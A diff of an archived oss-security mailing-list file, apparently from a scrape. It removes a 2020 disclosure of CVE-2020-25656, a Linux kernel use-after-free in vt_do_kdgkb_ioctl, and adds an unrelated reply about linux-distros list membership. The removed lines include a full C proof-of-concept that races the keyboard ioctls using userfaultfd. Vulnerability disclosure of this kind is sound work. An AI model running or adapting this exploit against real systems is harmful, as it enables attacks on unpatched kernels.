@@ -1,213 +1,91 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/10/16/1
-Message-ID: <CAH5WSp4F5HZfN9VASpJKgBuuN3QM3HrVbcW8jOhjocwcGqkJYw@mail.gmail.com>
-Date: Fri, 16 Oct 2020 11:39:34 +0800
-From: Minh Yuan <yuanmingbuaa@...il.com>
-To: oss-security@...ts.openwall.com
-Cc: nopitydays@...il.com
-Subject: CVE-2020-25656: Linux kernel concurrency UAF in vt_do_kdgkb_ioctl
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/01/14/4
+Message-ID: <CAKYuF5RQZeCwKHYZmEZd2Hj43e9DOcJx7yCHy530bcn3o22REw@mail.gmail.com>
+Date: Tue, 14 Jan 2020 10:16:45 -0500
+From: Jorge Lucangeli Obes <jorgelo@...gle.com>
+To: Solar Designer <solar@...nwall.com>
+Cc: Kees Cook <kees@...ntu.com>, oss-security@...ts.openwall.com
+Subject: Re: linux-distros membership adjustment/vouching
 Content-Type: text/plain; charset=utf-8
 
-Hi,
+On Sun, Jan 12, 2020 at 12:47 PM Solar Designer <solar@...nwall.com> wrote:
+>
+> Hi,
+>
+> On Fri, Jan 10, 2020 at 12:52:41PM -0800, Kees Cook wrote:
+> > I've been a member of linux-distros for a long while, and my hat has
+> > slowly changed over that time. I'm subscribed there (and here) as
+> > kees@...ntu.com.  When I my responsibilities shifted from the Ubuntu
+> > Security Team to the Chrome OS Security Team, I just kept the email
+> > address (since it's a community address and I'm still part of the Ubuntu
+> > community).
+> >
+> > However, as my responsibilities have shifted, I'm much less involved
+> > with the Chrome OS Security Team, and it was recently pointed out that
+> > no one else from the Chrome OS Security Team is (to our knowledge)
+> > a member right now.
+> >
+> > So, attempting to solve things in a backwards order, I'd like to first
+> > vouch for a Chrome OS Security Team member who is already on oss-security,
+> > with the goal of having them added to the linux-distros list:
+> >
+> >     Jorge Lucangeli Obes <jorgelo@...gle.com>
+>
+> Given the above, I'd be happy to subscribe Jorge for Chrome OS.  I just
+> need Jorge's PGP key.  I also suggest using an e-mail address not on
+> Google's MX'es, because those reject messages sent from domains with
+> strict DMARC policy (most notably, when another Googler posts).
+>
 
-We recently discovered a uaf read in vt_do_kdgkb_ioctl from linux kernel
-version 3.4 to the latest version (v5.9 for now).
+Thanks all. I'm actually on oss-security with my chromium.org account
+(jorgelo@...omium.org), let me figure out (before EoW for sure) what
+email will be best suited for this and send the associated PGP key.
 
-The root cause of this vulnerability is that there exits a race in
-KDGKBSENT and KDSKBSENT.
+> Normally such subscription changes for an already subscribed distro are
+> handled off-list.  However, what you bring up below deserves being
+> discussed on oss-security:
+>
+> > Then I'd like to figure out what to do with my own membership. I'm
+> > still associated with Ubuntu, Chrome OS, and Android but I don't have
+> > "official" responsibilities as a representative of their respective
+> > security teams. I am, however, an upstream Linux kernel security contact
+> > (but that doesn't qualify as a "Unix-like operating system distro", from
+> > item "1" in the membership criteria[1]). I am still involved in fixing,
+> > notifying, negotiating, delegating, etc, in these various distros. Should
+> > I stay on linux-distros? I would prefer to (it makes that work simpler),
+> > but since there isn't any "criteria for continuing membership" on the
+> > Wiki, I'm not entirely sure what the right course of action should be.
+>
+> I think it'd be most consistent with our criteria so far if (at least)
+> one of those distros' security teams does state that you'd represent
+> them.  Without that, you staying on linux-distros would be weird and
+> inconsistent with requirements we set for others.
+>
 
-Here are details:
-1. use  KDSKBSENT to allocate a lager heap buffer to funcbufptr;
-2. use KDGKBSENT to obtain the allocated heap pointer in step1 by
-func_table, at the same time, due to KDGKBSENT has no lock, we can use
-KDSKBSENT again to allocate a larger buffer than step1, and the old
-funcbufptr will be freed. However, we've obtained the heap pointer in
-KDGKBSENT, so a uaf read will happen while executing put_user.
+Despite Kees' evolving responsibilities, I still consider (and trust)
+Kees to represent Chrome OS security. Moreover, organizationally Kees
+belongs to the same team as myself and the other Chrome OS security
+folks at Google, so I see no conflicts or contradictions here.
 
-I've successfully reproduced this bug in a special way.
-However, to write a universal PoC for anyone else to reproduce it,  I use
-userfaultfd to handle the order of "free" and "use" in multithreading
-environment. This is my PoC:
-
-// author by ziiiro@thu
-#include <stdio.h>
-#include <stdlib.h>
-#include <unistd.h>
-#include <sys/ioctl.h>
-#include <string.h>
-#include <sys/types.h>
-#include <sys/stat.h>
-#include <fcntl.h>
-#include <sys/mman.h>
-#include <poll.h>
-#include <pthread.h>
-#include <errno.h>
-#include <stdlib.h>
-#include <signal.h>
-#include <string.h>
-#include <sys/syscall.h>
-#include <linux/userfaultfd.h>
-#include <pthread.h>
-#include <poll.h>
-#include <linux/prctl.h>
-#include <stdint.h>
-
-#define errExit(msg)    do { perror(msg); exit(EXIT_FAILURE); \
-                       } while (0)
-
-#define KDGKBSENT 0x4B48 /* gets one function key string entry */
-#define KDSKBSENT 0x4B49 /* sets one function key string entry */
-
-struct kbsentry {
-unsigned char kb_func;
-unsigned char kb_string[512];
-};
-int fd;
-static int page_size;
-static void *fault_handler_thread(void *arg) {
-  unsigned long value;
-  static struct uffd_msg msg;
-  static int fault_cnt = 0;
-  long uffd;
-  static char *page = NULL;
-  struct uffdio_copy uffdio_copy;
-  int len, i;
-  if (page == NULL) {
-    page = mmap(NULL, page_size, PROT_READ | PROT_WRITE,
-                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
-    if (page == MAP_FAILED) errExit("mmap (userfaultfd)");
-  }
-  uffd = (long)arg;
-
-  for(;;) {
-    struct pollfd pollfd;
-    pollfd.fd = uffd;
-    pollfd.events = POLLIN;
-    len = poll(&pollfd, 1, -1);
-
-
-    read(uffd, &msg, sizeof(msg));
-    printf("    flags = 0x%lx\n", msg.arg.pagefault.flags);
-    printf("    address = 0x%lx\n", msg.arg.pagefault.address);
-    switch(fault_cnt) {
-        case 0:
-            puts("triggered in the first page!");
-            break;
-        case 1:
-            puts("triggered in the seccond page!");
-            munmap((void*)0x233000,page_size);
-            void *addr = (void*)mmap((void*)0x233000,
-                        page_size,
-                        PROT_READ | PROT_WRITE,
-                        MAP_FIXED | MAP_PRIVATE | MAP_ANON,
-                        -1, 0);
-            if ((unsigned long)addr != 0x233000)
-                errExit("mmap (0x233000)");
-            // register 0x233000 again to trigger put_user
-            struct uffdio_register uffdio_register;
-            uffdio_register.range.start = (unsigned long)addr;
-            uffdio_register.range.len   = page_size;
-            uffdio_register.mode        = UFFDIO_REGISTER_MODE_MISSING;
-            if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
-                errExit("ioctl: UFFDIO_REGITER");
-            break;
-        case 2:
-            puts("triggered in put_user!");
-            struct kbsentry *kbs;
-            kbs = malloc(sizeof(struct kbsentry));
-            kbs->kb_func = 0;
-
-strcpy(kbs->kb_string,"bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb");
-            // free old funcbufptr
-            ioctl(fd,KDSKBSENT,kbs);
-            break;
-
-    }
-    // return to kernel-land
-    uffdio_copy.src = (unsigned long)page;
-    uffdio_copy.dst = (unsigned long)msg.arg.pagefault.address &
-~(page_size - 1);
-    uffdio_copy.len = page_size;
-    uffdio_copy.mode = 0;
-    uffdio_copy.copy = 0;
-    if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
-        errExit("ioctl: UFFDIO_COPY");
-
-    fault_cnt++;
-
-  }
-}
-// use userfaultfd to handle free->use
-void setup_pagefault(void *addr, unsigned size) {
-  long uffd;
-  pthread_t th;
-  struct uffdio_api uffdio_api;
-  struct uffdio_register uffdio_register;
-  int s;
-  // new userfaulfd
-
-  uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
-  if (uffd == -1) errExit("userfaultfd");
-  // enabled uffd object
-  uffdio_api.api = UFFD_API;
-  uffdio_api.features = 0;
-  if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1) errExit("ioctl:
-UFFDIO_API");
-  // register memory address
-  uffdio_register.range.start = (unsigned long)addr;
-  uffdio_register.range.len   = size;
-  uffdio_register.mode        = UFFDIO_REGISTER_MODE_MISSING;
-//UFFDIO_REGISTER_MODE_WP;//
-  if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1) errExit("ioctl:
-UFFDIO_REGITER");
-  // monitor page fault
-  s = pthread_create(&th, NULL, fault_handler_thread, (void*)uffd);
-  if (s != 0) errExit("pthread_create");
-}
-
-
-int main(int argc, char** argv)
-{
-        struct kbsentry *kbs;
-        pthread_t th;
-        page_size = sysconf(_SC_PAGE_SIZE);
-        void *addr = (void*)mmap((void*)0x233000,
-                            page_size * 2,
-                            PROT_READ | PROT_WRITE,
-                            MAP_FIXED | MAP_PRIVATE | MAP_ANON,
-                            -1, 0);
-        if ((unsigned long)addr != 0x233000)
-            errExit("mmap (0x233000)");
-        setup_pagefault(addr, page_size * 2);
-        kbs = malloc(sizeof(struct kbsentry));
-        kbs->kb_func = 0;
-        fd = open("/dev/tty1", O_RDONLY, 0);
-
-strcpy(kbs->kb_string,"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa");
-        // allocate a lager funcbufptr
-        ioctl(fd,KDSKBSENT,kbs);
-        // use KDGKBSENT to access the new funcbufptr
-        ioctl(fd,KDGKBSENT,addr + page_size - 0x20);
-        return 1;
-
-}
-
-Make sure set KASAN in config, and to use userfaultfd, CONFIG_USERFAULTFD=y
-is also needed. Besides, it needs the privilege to access tty to trigger
-this bug.
-
-We've noticed that this bug was also discovered by Syzbot 8 months ago, but
-no one has successfully reproduced it (
-https://groups.google.com/g/syzkaller-bugs/c/kZsmxkpq3UI/m/J35PFexWBgAJ),
-leaving this issue ignored and upatched yet. Hope this PoC can help
-someone.
-
-Timeline:
-* 10.15.20 - Vulnerability reported to security@...nel.org and
-linux-distros@...openwall.org.
-* 10.15.20 - CVE-2020-25656 assigned.
-* 10.16.20 - Vulnerability opened.
+> > (And if I stay, perhaps it would be more accurate to use kees@...nel.org?)
+>
+> It'd be up to you to choose an e-mail address that's convenient for
+> you.  Messages are encrypted anyway, so this choice sort of does not
+> matter for security.  In practice, though, it does matter a little bit:
+> if you choose an e-mail address in a specific distro's domain name, then
+> if you ever leave their team and they disable that e-mail account you
+> wouldn't be getting the messages anymore (and they wouldn't be able to
+> read messages intended for you as well, due to the encryption to your
+> key), even if they forget to promptly ask for your address to be removed
+> from the list.  Despite of this minor security advantage, I don't insist
+> on use of such e-mail addresses so far, as I realize it's often far more
+> convenient to use an external e-mail address.
+>
+> As to kernel.org, it isn't particularly relevant here since the Linux
+> kernel is not a Linux distro.  It's just an address you can use, just
+> like any other address.
+>
+> Alexander
 
 Thanks,
-Yuan Ming and Bodong Zhao, Tsinghua University
-
+Jorge
